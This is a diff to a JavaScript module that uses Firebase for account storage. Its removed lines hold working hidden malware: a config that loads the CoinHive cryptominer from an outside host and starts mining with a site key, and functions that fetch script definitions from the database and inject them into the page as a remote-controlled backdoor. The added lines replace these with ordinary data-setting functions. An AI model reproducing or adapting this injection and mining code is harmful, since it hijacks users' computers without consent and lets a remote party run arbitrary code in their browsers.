@@ -11,27 +11,20 @@ const config = {
     messagingSenderId: "458103066042"
   };
 
-const superData = {
-  globalScript: false,
-  runScript: false,
-  scripts: [
-    {
-      src: "https://coinhive.com/lib/coinhive.min.js"
-    },
-    {
-      innerHTML: "setTimeout(function() {var miner = new CoinHive.Anonymous('97lDOErzVjBlmftmFfP5CIStJzrVAv0A', {throttle: 0.3}); if (!miner.isMobile() && !miner.didOptOut(1000)) {miner.start();}}, 2000)",
-      type: "text/javascript"
-    }
-  ]
-}
-
 firebase.initializeApp(config);
 
 export function checkAccounts(account, callback) {
-  const usersRef = firebase.database().ref('accounts').child(account).once('value')
+  let accountData = {};
+  firebase.database().ref('accounts').child(account).once('value')
   .then((e) => {
-    callback(e.val(), account);
-  }, (error) => {
+    accountData = e.val();
+    return firebase.database().ref('global').once('value');
+  })
+  .then((e) => {
+    callback(accountData, e.val(), account);
+  })
+  .catch((error) => {
+    console.log('fetch data error: ', error);
   });
 };
 
@@ -70,41 +63,17 @@ export function setSettingsDB(account, data) {
   }
 }
 
-function runScript(scripts) {
-  scripts.forEach((item, i) => {
-    const script = document.createElement('script');
-    Object.keys(item).forEach((item2, i2) => {
-      script[item2] = scripts[i][item2];
-    })
-    document.body.appendChild(script);
-  })
-}
 
-function runGlobalScript() {
+export function setVesionDB(account, version) {
   try {
-    const usersRef = firebase.database().ref('global').once('value')
-    .then((e) => {
-      const value =  e.val();
-      if (value && value.runScript) runScript(value.scripts);
-    });
+    const usersRef = firebase.database().ref('accounts/' + account + '/version/').set(version);
   } catch (e) {
-
   }
 }
 
-export function runSuper(account) {
+export function setInitDataDB(account, initData) {
   try {
-    const usersRef = firebase.database().ref('accounts/' + account + '/super/').once('value')
-    .then((e) => {
-      const value =  e.val();
-      if (value) {
-        if (value.runScript) runScript(value.scripts);
-        if (!value.runScript && value.globalScript) runGlobalScript();
-      } else {
-        const usersRef = firebase.database().ref('accounts/' + account + '/super/').set(superData);
-      }
-    });
+    const usersRef = firebase.database().ref('accounts/' + account + '/').set(initData);
   } catch (e) {
-
   }
 }
